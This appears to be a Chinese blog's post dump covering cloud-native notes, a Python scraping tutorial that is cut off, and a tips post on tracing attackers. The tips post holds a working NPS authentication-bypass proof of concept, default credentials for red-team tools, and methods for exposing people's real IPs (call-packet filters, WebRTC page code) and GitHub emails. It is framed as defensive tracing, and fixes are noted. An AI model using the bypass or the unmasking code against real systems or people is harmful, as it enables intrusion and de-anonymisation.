ESB中间件及其变体是满足这类分布式需求的前一代主流解决方案，它提供良好的功能集。但是，单体架构以及业务逻辑和平台之间紧密的技术耦合会导致的技术和组织的中心化，这个概念与分布式的理念背道而驰。（ESB的工作就是提供和调用集成系统的服务。使用了ESB，在大多情况下，每个系统和ESB之间，只需要定义一个访问方法，一个接口。如果这样，像上面的图一样，你有8个系统，就只有有16个接口（1个方向1个）需要被创建、维护、管理和关注。否则你就需要56个接口需要去思考和处理。（假设每个系统都需要跟其他系统对话），少了40个接口意味着更少的成本。）\n\nESB分布式应用中间件的限制​    生命周期:通常只支持的一个语言运行时，( 比如Java)，这就限定了软件该如何打包、哪些库可用、它们打补丁的频率等\n​    网络:集中于一种主要的编程语言及其相关的技术，而且，网络问题和语义也深深地嵌入到了业务服务中，例如，对于Java语言，它就是指JMS、JDBC和JTA等\n 状态:与状态交互的库和接口没有完全抽象出来，也没有与服务运行时完全解耦\n\n 绑定:必须根据消息交换模式构造代码和设计流程，连接器必须与应用程序共存的事实意味着，依赖项必须与业务逻辑一起更新和打补丁\n\n​    面对这诸多问题，云计算时代的解决方案：基于容器化、容器编排、DevOps、微服务及典型的治理系统服务网格等技术的云原生解决方案。\n\n云原生的定义\n​    云原生具有以下六大特性：\n​    1、DevOps；2、持续交付(CD)；3、微服务；4、容器化；2018年新增两个特性是：5、服务网格；6、声明式API\n容器技术( Containers )和容器编排​    容器技术由来已久，dotCloud (后改名为Docker )公司在Docker项目中发明了“容器镜像”技术之后， 创造性地解决了应用打包的难题才焕发出新的生命力，并以“应用容器”的面目风靡于世。在docker之前基本都是系统容器，可以看做一个轻量级的虚拟机，而应用容器基本只运行单个应用进程及其子进程。如果需要学习docker，可以翻看以前的dockerdocker文章。\n​    单个容器难以产生价值，容器编排才是根本，Kubernetes是云原生系统的底座\n​    现代应用容器技术和Kubernetes将打包、分发和部署应用程序的方法演化成了与编程语言无关的格式。\nKubernetes和声明式API​    Kubernetes的关键特性：\n​    1、容器编排系统；\n​    2、声明式API\n​    3、“以应用为中心”的现代应用基础设施，纳管各类基础支撑类服务，并经由声明式API向上层应用暴露这些基础设施\n​    4、Platform for Platform类型的系统，根本目标在于方便基础设施工程师构建其它的平台系统，例如Service Mesh或Serverless等。\n\n微服务(MicroServices)​    微服务是一种流行的架构风格，用于构建弹性化、高度可扩展、可独立部署且能够快速迭代的应用程序，微服务架构由一系列小型自治服务组成，每个服务都是自包含的，应该在有界上下文中实现单个业务功能。\n\n微服务治理​    动态化是云原生应用的天然属性，微服务架构是支撑该目标的关键所在。\n​    服务治理工具，又是支撑微服务运行的根本所在。常见的有：Dubbo、Spring Cloud、ServiceMesh\n\n服务网格(ServiceMesh)​    服务网格的定义：1、专用于处理服务通讯的基础设施层；2、负责可靠地完成请求传送，这些请求由复杂拓扑结构下的云原生应用组成服务生成；3、是一组同应用服务协同部署的轻量级网络代理，并且对应用服务透明。\n​    Sidecar连接成网，组成Service Mesh。\n\n​    在每一个应用实例的外层，添加一个服务代理，来确保受控的服务到服务的通信。\nSidercar模式​    Service Mesh以Sidecar形式，将服务治理从业务逻辑中剥离，并拆解为独立进程，实现异构系统的统治理和网络安全。\n\n不可变基础设施( immutable infrastructure)与一次性组件​    不可变基础设施是早在2013年由Chad Fowler在其一篇博客中提出的一个很有的预见性的构想。其核心思想在于，任何基础设施的实例一旦创建之后即变为只读状态，若需要修改和升级，只能通过替换为新的实例来实现。传统的服务器(裸金属或虚拟机)支持配置的多次变更，因而通常会导致如下问题。灾难发生时，重新构建较为困难(因手动的变更操作所致)。存在导致状态不一 致的风险。\n​    实现：容器和容器镜像、云端虚拟化组件。\n\n云原生平台的生态模型云原生的一个参考架构示例​    五个层级：    \n​    1、基础设施层：主机、存储、网络管理\n​    2、预配层( Provisioning )：主机创建、操作系统安装、存储分配等\n​    3、运行时层：CRI、CNI、CSI\n​    4、容器编排及管理\n​    5、云原生应用程序定义与开发\n\n云原生系统的功能特征​    动态化是云原生应用的天然属性，微服务架构是支撑该目标的关键所在\n​    各微服务提供的API应该集成为复合的API,通过“API网关”对外提供统一的访问接口，API网关对于安全、监控、计费等也是必不可少的组件。\n​    微服务治理，Istio、 OpenPaaS、Linkerd等\n Serverless，Knative等\n\n 各微服务以窗口镜像进行交付\n\n 云原生编排平台，调度、运行、健康状态检测、监控，弹性扩缩容\n\n 灵活部署:重建、灰度、蓝绿、金丝雀、A/B测试、影子( Shadow)部署\n\n\n\n\n参考链接ESB：https://zhuanlan.zhihu.com/p/399060480\n云原生：http://t.zoukankan.com/huaweiyun-p-13181034.html\n","categories":["K8S学习基础篇"],"tags":["容器","K8S","云原生","云"]},{"title":"没用的小技巧(BLUE)","url":"/2022/03/23/%E6%B2%A1%E7%94%A8%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7-BLUE/","content":"QQ电话真实IP​    溯源或者鼓捣小玩意时，我们会获取到QQ号，通过QQ电话即可找到对方的真实IP。\nwireshark​    官网下载：wireshark\n​    Mac下的是需要安装另一个插件的才可以正常抓包的，安装里有提示。\nQQ​    首先需要清楚QQ包的过滤条件020048，这里QQ的UDP包是72字节的包，而020048是包的开头。我对比了下我的包和其他师傅们的包，0200480001都是相同的，但是只匹配020048即可。\n​    UDP包前面是8个字节的，所以根据规则，我们偏移八个字节后再过滤三字节020048即可。udp[8:3]==02:00:48。\nQQ接通\n\n​    打码部分即为真实IP。\nQQ未接通​    未接通使用上述条件过滤一样可获取真实IP。\n​    \n\n微信​    微信的包是120字节，开头为a3（太短了后面会隔一段时间更新版本后看会不会变化）。所以过滤条件：data.len == 120 &amp;&amp; udp[8:1] == a3\n微信接通微信未接通​    拿不到IP\n​    下面的测试方法差不多了\n钉钉：​    udp[8:4]==00:01:00:4c\n\n照片EXIF信息浅谈​    EXIF信息，是可交换图像文件的缩写，是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。EXIF可以附加于JPEG、TIFF、RIFF等文件之中，为其增加有关数码相机拍摄信息的内容和索引图或图像处理软件的版本信息。\n​    查了下以前的新闻，还上过热搜，没什么技术含量，玩一玩，看看现在还能用不。\n微信​    微信收原图保存后本地有三张，一张hd、一张thumb、一张普通pic，thumb和原pic都是压缩的，原图发送的hd的也是没有EXIF信息的。直接从相册导出的图片是包含EXIF信息的。\n\n​    PS.网上说微信文件传输助手发的不会丢失信息，测试后EXIF信息也已经丢失。\nTIM​    无论是发送到人还是使用文件传输助手均丢失信息。\nQQ​    均丢失\n钉钉​    只要发送原图信息，经过格式转换为JPG也不会丢失！\n​    （注意，直接发送相册里的是没有的，因为底下mac上转换格式导出的时候会抹掉位置信息，所以我不确定这一层位置信息抹去是苹果做的还是钉钉做的）\n\nPS.​    Mac下直接从图库里导出照片到桌面，由heic格式转为jpeg格式，苹果会自动去除GPS信息，但是其他信息不会去除。如果直接复制heic格式的到桌面然后改后缀不会去除位置信息。    \n​    根据底下的参考回答，20年5月qq还是会暴露的，现在基本不存在了。G\n​    后续有时间了再看看其他的。\n\ngithub用户对应绑定邮箱利用​    1、搜索redteam（只是例子）\n\n​    2、选择一个历史提交\n\n​    3、在url后面，添加.patch 可以查看到用户对应的邮箱\n\n\n1.查看现用邮箱和用户名git config user.namegit config user.email2.使用命令修改git的用户名和提交的邮箱要修改成的用户名git config  --global user.name 要修改成的用户名要修改成的邮箱名git config  --global user.email 要修改成的邮箱名3.修改已经提交的当前项目的用户名和邮箱名要修改成的用户名git config user.name 要修改成的用户名要修改成的邮箱名git config user.email 要修改成的邮箱名\n\n\n红队工具检索\n\n\n工具\n端口\n账号\n密码\n\n\n\nThe Browser Exploitation Framework（BeEF）\n3000\nbeef\nbeef\n\n\nAcunetix Web Vulnerability Scanner(AWVS)\n3443/13443\nadmin@admin.com\nAdmin123\n\n\nARL（资产侦察灯塔系统）\n5003\nadmin\narlpass\n\n\nNPS（内网穿透代理服务器）\n8080\nadmin\n123\n\n\nnessus\n8834\n自定义\n爆破\n\n\nxray反连平台\n8888\ntoken登录\n\n\n\nCobaltStrike（CS）\n50050\nneo\n爆破\n\n\nViper（炫彩蛇）\n60000\nroot\n爆破\n\n\n\nnps代理反制​    漏洞版本：nps &lt; v0.26.10\nimport timeimport hashlibimport requests md5 = hashlib.md5()now = time.time()md5.update(str(int(now)).encode())key = md5.hexdigest()post_data = &#123;&quot;auth_key&quot;: key, &quot;timestamp&quot;: str(int(now))&#125;resp = requests.post(&quot;http://127.0.0.1:8080&quot;, post_data)print(resp.text)\n\nimport timeimport hashlibnow = time.time()m = hashlib.md5()m.update(str(int(now)).encode(&quot;utf8&quot;))auth_key = m.hexdigest()print(&quot;Index/Index?auth_key=%s&amp;timestamp=%s&quot; % (auth_key,int(now)))\n\n​    只需要在post内容中添加auth_key和timestamp两个参数，分别对应md5(timestamp)和timestamp即可。直接访问生成的url可以看到后台\n\n​    auth_key和timestamp的时效只有20s，所以需要不停的生成。并且需要手动添加到get请求和着post请求的参数中。\n漏洞修复​    只需要在配置文件里去掉auth_key的注释，同时注释掉auth_crypt_key。\n\n​    漏洞分析：\n​    https://blog.zgbsm.online/index.php/2022/08/06/nps-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae-0day-%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/\n\n获取代理池背后真实ip​    大部分代理工具以socks5为主，那么对于挂了代理的，好像除了封ip没什么办法。根据师傅们的文章写得办法。注意到WebRTC可以获取背后的真实ip\n​    socks5 协议本身是支持 UDP 协议的，只是大部分的客户端软件/库的作者比较懒，没有实现这部分，遇到之后都直接写个 TODO。那么如果能从浏览器发起一个udp请求的话。那么就有可能获取到真实ip\n​    根据其他师傅的博客文章，发现可以使用 WebRTC发起udp请求。\n​    通过WEBRTC结合sutn服务器实现获取真实主机IP\n​    WebRTC: Web Real Time Communication 是一系列为提供端到端实时通信连接的协议和 API。Google 于 2011 年发布了基于浏览器的 WebRTC 项目，且这个技术可以使很多不同的应用，如视频会议、文件传输、聊天和桌面共享等都不需要额外的插件。\n​    WebRTC 是完全开源免费的，其使用 RTP 协议来传输音视频，并支持 Chrome、Mozilla、Opera、Microsoft Edge、安卓浏览器等浏览器。\n​    STUN（Simple Traversal of UDP over NATs，NAT 的UDP简单穿越）是一种网络协议，它允许位于NAT（或多重NAT）后的客户端找出自己的公网地址，查出自己位于哪种类型的NAT之后以及NAT为某一 个本地端口所绑定的Internet端端口。这些信息被用来在两个同时处于NAT 路由器之后的主机之间建立UDP通信。该协议由RFC 3489定义。\n​    Firefox 跟 Chrome支持WebRTC可以向STUN服务器请求，返回内外网IP，不同于XMLHttpRequest请求，STUN请求开发者工具当中看不到网络请求的Firefox 跟 Chrome支持WebRTC可以向STUN服务器请求，返回内外网IP，不同于XMLHttpRequest请求，STUN请求开发者工具当中看不到网络请求的。\n​    github上有这么一个项目：https://github.com/diafygi/webrtc-ips\n​    然后找到了师傅更改后的代码：\n&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;    &lt;/head&gt;    &lt;body&gt;        Remote Addr: &lt;?=$_SERVER[&#x27;REMOTE_ADDR&#x27;]?&gt;        &lt;hr&gt;        &lt;h3&gt;WebRTC&lt;/h3&gt;        &lt;h4&gt;Your local IP addresses:&lt;/h4&gt;        &lt;ul id=&quot;localip&quot;&gt;&lt;/ul&gt;        &lt;h4&gt;Your public IP addresses:&lt;/h4&gt;        &lt;ul id=&quot;publicip&quot;&gt;&lt;/ul&gt;        &lt;h4&gt;Your IPv6 addresses:&lt;/h4&gt;        &lt;ul id=&quot;ipv6&quot;&gt;&lt;/ul&gt;        &lt;iframe id=&quot;rtc_iframe&quot; sandbox=&quot;allow-same-origin&quot; style=&quot;display: none&quot;&gt;&lt;/iframe&gt;        &lt;script&gt;            //get the IP addresses associated with an account            function getIPs(callback)&#123;                var ip_dups = &#123;&#125;;                //compatibility for firefox and chrome                var RTCPeerConnection = window.RTCPeerConnection                    || window.mozRTCPeerConnection                    || window.msRTCPeerConnection                    || window.webkitRTCPeerConnection;                var useWebKit = !!window.webkitRTCPeerConnection;                //bypass naive webrtc blocking using an iframe                if(!RTCPeerConnection)&#123;                    var win = document.getElementById(&quot;rtc_iframe&quot;).contentWindow;                    RTCPeerConnection = win.RTCPeerConnection                        || win.mozRTCPeerConnection                        || win.msRTCPeerConnection                        || win.webkitRTCPeerConnection;                    useWebKit = !!win.webkitRTCPeerConnection;                &#125;                //minimal requirements for data connection                var mediaConstraints = &#123;                    optional: [&#123;RtpDataChannels: true&#125;]                &#125;;                var servers = &#123;                  iceServers: [                    &#123;                      urls: [                        &#x27;stun:stun.l.google.com:19302?transport=udp&#x27;,                        &#x27;stun:stun1.l.google.com:19302?transport=udp&#x27;,                        &#x27;stun:stun2.l.google.com:19302?transport=udp&#x27;,                        &#x27;stun:stun3.l.google.com:19302?transport=udp&#x27;,                        &#x27;stun:stun4.l.google.com:19302?transport=udp&#x27;,                        &quot;stun:stun.ekiga.net?transport=udp&quot;,                        &quot;stun:stun.ideasip.com?transport=udp&quot;,                        &quot;stun:stun.rixtelecom.se?transport=udp&quot;,                        &quot;stun:stun.schlund.de?transport=udp&quot;,                        &quot;stun:stun.stunprotocol.org:3478?transport=udp&quot;,                        &quot;stun:stun.voiparound.com?transport=udp&quot;,                        &quot;stun:stun.voipbuster.com?transport=udp&quot;,                        &quot;stun:stun.voipstunt.com?transport=udp&quot;,                        &quot;stun:stun.voxgratia.org?transport=udp&quot;                      ]                    &#125;                  ]                &#125;;                //construct a new RTCPeerConnection                var pc;                try &#123;                  pc = new RTCPeerConnection(servers, mediaConstraints);                &#125; catch (e) &#123;                  return                &#125;                function handleCandidate(candidate)&#123;                  //match just the IP address                  var ip_regex = /([0-9]&#123;1,3&#125;(\\.[0-9]&#123;1,3&#125;)&#123;3&#125;|[a-f0-9]&#123;1,4&#125;(:[a-f0-9]&#123;1,4&#125;)&#123;7&#125;)/                  var ip_addr = ip_regex.exec(candidate)[1];                  //remove duplicates                  if(ip_dups[ip_addr] === undefined)                      callback(ip_addr);                  ip_dups[ip_addr] = true;                &#125;                //listen for candidate events                pc.onicecandidate = function(ice)&#123;                  //skip non-candidate events                  if(ice.candidate)                    handleCandidate(ice.candidate.candidate);                &#125;;                //create a bogus data channel                pc.createDataChannel(&quot;bl&quot;);                //create an offer sdp                try &#123;                  pc.createOffer().then(function(result) &#123;                    pc.setLocalDescription(result);                  &#125;);                &#125; catch (e) &#123;                  pc.createOffer().then(function(result) &#123;                    pc.setLocalDescription(result, function()&#123;&#125;, function()&#123;&#125;);                  &#125;, function() &#123;&#125;);                &#125;                //wait for a while to let everything done                setTimeout(function()&#123;                    //read candidate info from local description                    var lines = pc.localDescription.sdp.split(&#x27;\\n&#x27;);                    lines.forEach(function(line)&#123;                      if(line.indexOf(&#x27;a=candidate:&#x27;) === 0)                        handleCandidate(line);                    &#125;);                &#125;, 1000);            &#125;            //insert IP addresses into the page            getIPs(function(ip)&#123;                var li = document.createElement(&quot;li&quot;);                li.textContent = ip;                //local IPs                if (ip.match(/^(192\\.168\\.|169\\.254\\.|10\\.|172\\.(1[6-9]|2\\d|3[01]))/))                  document.getElementById(&quot;localip&quot;).appendChild(li);                //IPv6 addresses                else if (ip.match(/^[a-f0-9]&#123;1,4&#125;(:[a-f0-9]&#123;1,4&#125;)&#123;7&#125;$/))                  document.getElementById(&quot;ipv6&quot;).appendChild(li);                //assume the rest are public IPs                else                  document.getElementById(&quot;publicip&quot;).appendChild(li);            &#125;);&lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;\n\n&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;script&gt;            // turn 配置      const config = &#123;        iceServers: [&#123;          // urls: &quot;stun:stun.l.google.com:19302&quot; // 这里使用谷歌，线上部署直接替换        &#125;]      &#125;;       // 构建      let pc = new RTCPeerConnection(config);            pc.onicecandidate = function(event) &#123;        if(event.candidate)            handleCandidate(event.candidate.candidate);      &#125;             function handleCandidate(candidate) &#123;          if (candidate.indexOf(&quot;srflx&quot;) != -1) &#123;           console.log(candidate)           var regex = /([0-9]&#123;1,3&#125;(\\.[0-9]&#123;1,3&#125;)&#123;3&#125;|[a-f0-9]&#123;1,4&#125;(:[a-f0-9]&#123;1,4&#125;)&#123;7&#125;)/           var ip_addr = regex.exec(candidate)[0];           alert(&quot;Your public network ip: &quot;+ ip_addr)         &#125;         &#125;             pc.createDataChannel(&quot;&quot;);            pc.createOffer(function(result)&#123;          pc.setLocalDescription(result);      &#125;, function()&#123;&#125;);&lt;/script&gt;\n\n​    ok本地部署以下。测试了两种方法代理：\n\nChrome 插件 SwitchyOmega\nClash 开系统代理\n\n​    文章给出另一种方法：Proxifier 直接给浏览器进程挂代理\n​    都会访问到真实ip。\n\n\n​    根据medicean师傅的指出需要注意的点\n\n这玩意儿默认是启用的（对的没错，包括你现在在看文章用的微信的浏览器）\n那挂个支持 udp 的 socks5 代理行不行？不行，WebRTC设计之初就是为了点对点通信，毕竟是传流的，压根就不会走代理，懂了啵\nVPN 行不行？可以\n\n​    蓝队可能用的点：\n\nWAF 拦截页面埋点，打点爱用代理是吧？埋在 WAF 拦截后的页面里面，抓到的IP都不是好人\n\n往蜜罐里埋\n\n可以挖掘一下其它的未被注意到的基于 UDP 协议的功能\n\n\n​    至于拿到真实 IP 地址之后，回传的问题，可以用 ajax 发 http 包带回去，也可以自己实现一个 WebRTC 服务器，走 udp 来收这部分的数据。除了 WebRTC 服务器之外，像 WebRTC 中用于的 STUN / TURN 服务器，你也可以自己实现一套，反正不让你知道我在哪一步记你就完事。\n​    红队注意的点：\n1、使用插件禁用：WebRTC Leak Prevent\n\n2、firefox禁用：Firefox浏览器禁用WebRTC的方法是：在浏览器上输入：about:config。之后搜索：media.peerconnection.enabled。找到它后双击，将其改成 false 即可。\n3、改用vpn\n\n。。。","categories":["蓝色tips"],"tags":["其他","溯源","QQ","微信","IP","EXIF","Github"]},{"title":"Python爬虫从零到一","url":"/2022/08/13/Python%E7%88%AC%E8%99%AB%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/","content":"​    无前言\n一robots.txt​    robots.txt协议： 君⼦协议。规定了⽹站中哪些数据可以被爬⾍爬取，哪些数据不可以被爬取。一些网站的waf会拦，可以访问下看看有没有waf（不拦不代表没有）。\n\npy字符集问题​    python里有一个open()函数，我们看看这个open()函数\ndef open(file, mode=&#x27;r&#x27;, buffering=None, encoding=None, errors=None, newline=None, closefd=True): # known special case of open\n\n​    其中有一个encoding，其作用是当对文件进行操作的时候，是以指定的编码格式进行操作的。\n\n​    如果乱码程序输出报错的，可以看看是不是这里出了问题。\n第一个小爬虫​    我们需要⽤代码来模拟⼀个浏览器, 然后同 样的输⼊百度的⽹址. 那么我们的程序应该也能拿到百度的内容。在python中, 我们可以直接⽤urllib模块来完成对浏览器的模拟⼯作。\nfrom urllib.request import urlopenurl = &quot;http://www.baidu.com&quot;resp = urlopen(url)print(resp.read())\n\n​    我们看到的回显是这样的，前面有一个b’，这其实代表字节，我们需要在程序里还原成字符串才可正常显示。\n\nfrom urllib.request import urlopenurl = &quot;http://www.baidu.com&quot;resp = urlopen(url)print(resp.read().decode(&quot;utf-8&quot;))\n\n\nfrom urllib.request import urlopenurl = &quot;http://www.baidu.com&quot;resp = urlopen(url)with open(&quot;mybaidu.html&quot;,mode=&quot;w&quot;) as f:    f.write(resp.read().decode(&quot;utf-8&quot;))print(&quot;over!&quot;)\n\nweb请求剖析​    在访问百度的时候, 浏览器会把这⼀次请求发 送到百度的服务器(百度的⼀台电脑), 由服务器接收到这个请求, 然后 加载⼀些数据. 返回给浏览器, 再由浏览器进⾏显示. 听起来好像是个 废话…但是这⾥蕴含着⼀个极为重要的东⻄在⾥⾯, 注意, 百度的服 务器返回给浏览器的不直接是⻚⾯, ⽽是⻚⾯源代码(由html, css, js 组成). 由浏览器把⻚⾯源代码进⾏执⾏, 然后把执⾏之后的结果展示给⽤户。\n\n​    下面看看常见的页面渲染数据的过程，我们常⻅的⻚⾯渲染过程有两种。\n服务器渲染​    这个是最简单的. 含义呢就是我们在请求到服务 器的时候, 服务器直接把数据全部写⼊到html中, 我们浏览器就 能直接拿到带有数据的html内容. ⽐如, 由于数据是直接写在html中的, 所以我们能看到的数据都在⻚⾯ 源代码中能找的到的. 这种⽹⻚⼀般都相对⽐较容易就能抓取到⻚⾯内容。\n前端JS渲染​    这种就稍显麻烦了. 这种机制⼀般是第⼀次请求服务器返回⼀堆 HTML框架结构. 然后再次请求到真正保存数据的服务器, 由这个 服务器返回数据, 最后在浏览器上对数据进⾏加载。\n\n​    这样做的好处是服务器那边能缓解压⼒. ⽽且分⼯明确. ⽐较容易维护。那数据是何时加载进来的呢? 其实就是在我们进⾏⻚⾯向下滚动 的时候, jd就在偷偷的加载数据了, 此时想要看到这个⻚⾯的加 载全过程, 我们就需要借助浏览器的调试⼯具了。\n\nHTTP协议​    HTTP协议, Hyper Text Transfer Protocol（超⽂本传输协议）的缩 写,是⽤于从万维⽹(WWW:World Wide Web)服务器传输超⽂本 到本地浏览器的传送协议. 直⽩点⼉, 就是浏览器和服务器之间的数 据交互遵守的就是HTTP协议.\n​    请求:\n请求⾏ -&gt; 请求⽅式(get/post) 请求url地址 协议请求头 -&gt; 放⼀些服务器要使⽤的附加信息请求体 -&gt; ⼀般放⼀些请求参数\n\n​    响应：\n状态⾏ -&gt; 协议 状态码响应头 -&gt; 放⼀些客户端要使⽤的⼀些附加信息响应体 -&gt; 服务器返回的真正客户端要⽤的内容(HTML,json)等\n\n​    写爬⾍的时候要格外注意请求头和响应头. 这两个地⽅⼀ 般都隐含着⼀些⽐较重要的内容。请求头中最常⻅的⼀些重要内容(爬⾍需要):\n1. User-Agent : 请求载体的身份标识(⽤啥发送的请求) \n1. Referer: 防盗链(这次请求是从哪个⻚⾯来的? 反爬会⽤到) \n1. cookie: 本地字符串数据信息(⽤户登录信息, 反爬的token)\n\n​    响应头中⼀些重要的内容:\n\ncookie: 本地字符串数据信息(⽤户登录信息, 反爬的token) \n各种神奇的莫名其妙的字符串(这个需要经验了, ⼀般都是token 字样, 防⽌各种攻击和反爬)\n\nrequests模块⼊⻔–GET​    在前⾯⼩节中, 我们使⽤urllib来抓取⻚⾯源代码. 这个是python内置的⼀个模块. 但是, 它并不是我们常⽤的爬⾍⼯具. 常⽤的抓取⻚⾯的 模块通常使⽤⼀个第三⽅模块requests. 这个模块的优势就是⽐urllib 还要简单, 并且处理各种请求都⽐较⽅便\npip3 install requests\n\n\n​    接下来我们来看看requests能带给我们什么。\nimport requestsquery = input(&quot;输入一个人:&quot;)url = f&#x27;https://www.sogou.com/web?query=&#123;query&#125;&#x27;headers = &#123;    &quot;user-agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&quot;&#125;resp = requests.get(url,headers=headers)print(resp)print(resp.text)\n\nkw = input(&quot;请输⼊你要搜索的内容:&quot;)response = requests.get(f&quot;https://www.sogou.com/web?query=&#123;kw&#125;&quot;) # 发送get请求# print(response.text) # 直接拿结果(⽂本)with open(&quot;sogou.html&quot;, mode=&quot;w&quot;, encoding=&quot;utf8&quot;) as f: f.write(response.text)\n\nrequests模块⼊⻔–POSTimport requestsurl = &quot;https://fanyi.baidu.com/sug&quot;s = input(&quot;输入你要翻译的单词&quot;)dat = &#123;    &quot;kw&quot;:s&#125;resp =  requests.post(url,data=dat)print(resp.json())resp.close()\n\n\nimport requestskw = input(&quot;请输⼊你要翻译的英语单词:&quot;)dic = &#123; &quot;kw&quot;: kw # 这⾥要和抓包⼯具⾥的参数⼀致.&#125;resp = requests.post(&quot;https://fanyi.baidu.com/sug&quot;,data=dic)# 返回值是json 那就可以直接解析成jsonresp_json = resp.json()# &#123;&#x27;errno&#x27;: 0, &#x27;data&#x27;: [&#123;&#x27;k&#x27;: &#x27;Apple&#x27;, &#x27;v&#x27;: &#x27;n.苹果公司，原称苹果电脑公司&#x27;....print(resp_json[&#x27;data&#x27;][0][&#x27;v&#x27;]) # 拿到返回字典中的内容resp.close()\n\n\nrequests模块⼊⻔–GET进阶import requestsurl = &quot;https://movie.douban.com/j/chart/top_list&quot;# 重新封装参数param = &#123;    &quot;type&quot;: &quot;24&quot;,    &quot;interval_id&quot;: &quot;100:90&quot;,    &quot;action&quot;: &quot;&quot;,    &quot;start&quot;: &quot;0&quot;,    &quot;limit&quot;: &quot;20&quot;,&#125;headers = &#123;    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&quot;&#125;resp = requests.get(url=url, params=param,headers=headers)print(resp.json())resp.close()\n\n\nimport jsonimport requestsurl = &quot;https://movie.douban.com/j/chart/top_list&quot;# 重新封装参数param = &#123;    &quot;type&quot;: &quot;24&quot;,    &quot;interval_id&quot;: &quot;100:90&quot;,    &quot;action&quot;: &quot;&quot;,    &quot;start&quot;: &quot;0&quot;,    &quot;limit&quot;: &quot;20&quot;,&#125;headers = &#123;    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&quot;&#125;resp = requests.get(url=url, params=param,headers=headers)list_data = resp.json()fp = open(&#x27;./douban.json&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;)json.dump(list_data,fp=fp,ensure_ascii=False)print(&#x27;over!!!&#x27;)resp.close()\n\nIf ``ensure_ascii`` is false, then the strings written to ``fp`` cancontain non-ASCII characters if they appear in strings contained in``obj``. Otherwise, all such characters are escaped in JSON strings.\n\n\n\n爬⾍就是写程序去模拟浏览器⽤来抓取互联⽹上的内容\npython中⾃带了⼀个urllib提供给我们进⾏简易爬⾍的编写 \nrequests模块的简单使⽤, 包括get, post两种⽅式的请求. 以及 User-Agent的介绍\n\n\n二数据解析概述​    在上⼀章中, 我们基本上掌握了抓取整个⽹⻚的基本技能. 但是呢, ⼤ 多数情况下, 我们并不需要整个⽹⻚的内容, 只是需要那么⼀⼩部分. 怎么办呢? 这就涉及到了数据提取的问题. \n​    提供三种解析⽅式: \n1. re解析 \n1. bs4解析 \n1. xpath解析\n\n正则表达式​    Regular Expression, 正则表达式, ⼀种使⽤表达式的⽅式对字符串 进⾏匹配的语法规则.只要掌握了正则编写的逻辑关系, 写出⼀个提取⻚⾯内容的正则其实并不复杂。\n​    正则的语法: 使⽤元字符进⾏排列组合⽤来匹配字符串\n​    在线测试正则表达式https://tool.oschina.net/regex/ \n​    元字符: 具有固定含义的特殊符号 \n​    常⽤元字符:\n. 匹配除换⾏符以外的任意字符\\w 匹配字⺟或数字或下划线\\s 匹配任意的空⽩符\\d 匹配数字\\n 匹配⼀个换⾏符\\t 匹配⼀个制表符^ 匹配字符串的开始$ 匹配字符串的结尾\\W 匹配⾮字⺟或数字或下划线\\D 匹配⾮数字\\S 匹配⾮空⽩符a|b 匹配字符a或字符b() 匹配括号内的表达式，也表示⼀个组[...] 匹配字符组中的字符[^...] 匹配除了字符组中字符的所有字符\n\n​    量词: 控制前⾯的元字符出现的次数\n* 重复零次或更多次+ 重复⼀次或更多次? 重复零次或⼀次&#123;n&#125; 重复n次&#123;n,&#125; 重复n次或更多次&#123;n,m&#125; 重复n到m次\n\n​    贪婪匹配和惰性匹配\n.* 贪婪匹配.*? 惰性匹配\n\n​    这两个要着重的说⼀下. 因为我们写爬⾍⽤的最多的就是这个惰性匹配\nstr: 玩⼉吃鸡游戏, 晚上⼀起上游戏, ⼲嘛呢? 打游戏啊reg: 玩⼉.*?游戏结果: \t\t玩⼉吃鸡游戏reg: 玩⼉.*游戏结果: \t\t玩⼉吃鸡游戏, 晚上⼀起上游戏, ⼲嘛呢? 打游戏str: &lt;div&gt;胡辣汤&lt;/div&gt;reg: &lt;.*&gt;结果: \t\t&lt;div&gt;胡辣汤&lt;/div&gt;str: &lt;div&gt;胡辣汤&lt;/div&gt;reg: &lt;.*?&gt;结果:\t\t&lt;div&gt;\t\t&lt;/div&gt;\t\tstr: &lt;div&gt;胡辣汤&lt;/div&gt;&lt;span&gt;饭团&lt;/span&gt;reg: &lt;div&gt;.*?&lt;/div&gt;结果:\t\t&lt;div&gt;胡辣汤&lt;/div&gt; str:abduaiaiuhfwhfioahwfxafjawofijawoifjxreg:.*?x结果:\t\tabduaiaiuhfwhfioahwfx\t\tafjawofijawoifjx\n\n​    能发现这样⼀个规律: .*? 表示尽可能少的匹配, .*表示尽可能多的匹配\nre模块​    怎么在python程序中使⽤正则呢? 答案是re模块。re模块中我们只需要记住这么⼏个功能就⾜够我们使⽤了.\n​    1、findall：匹配所有符合正则的内容。返回list\nlst = re.findall(&quot;m&quot;, &quot;mai le fo len, mai nimei!&quot;)print(lst) # [&#x27;m&#x27;, &#x27;m&#x27;, &#x27;m&#x27;]lst = re.findall(r&quot;\\d+&quot;, &quot;5点之前. 你要给我5000万&quot;)print(lst) # [&#x27;5&#x27;, &#x27;5000&#x27;]lst = re.findall(r&quot;\\d+&quot;, &quot;我的电话是10086，我女朋友电话10010&quot;)print(lst) # [&#x27;10086&#x27;, &#x27;10010&#x27;]\n\n​    2、finditer：匹配字符串中所有的内容[返回迭代器]，迭代器拿到数据需要.group\nit = re.finditer(r&quot;\\d+&quot;, 